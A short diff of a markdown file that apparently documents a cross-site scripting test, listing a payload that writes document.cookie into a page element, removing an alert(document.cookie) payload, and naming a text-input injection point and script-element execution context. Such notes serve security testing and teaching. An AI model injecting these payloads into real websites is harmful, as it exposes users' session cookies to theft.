@@ -14,8 +14,6 @@
 
 **payload**: `document.getElementById('cookieOutput').innerHTML = 'Cookie value: '+document.cookie`
 
-**payload**: `alert(document.cookie)`
-
 **injection point**: text input field
 
 **execution context**: script element creation
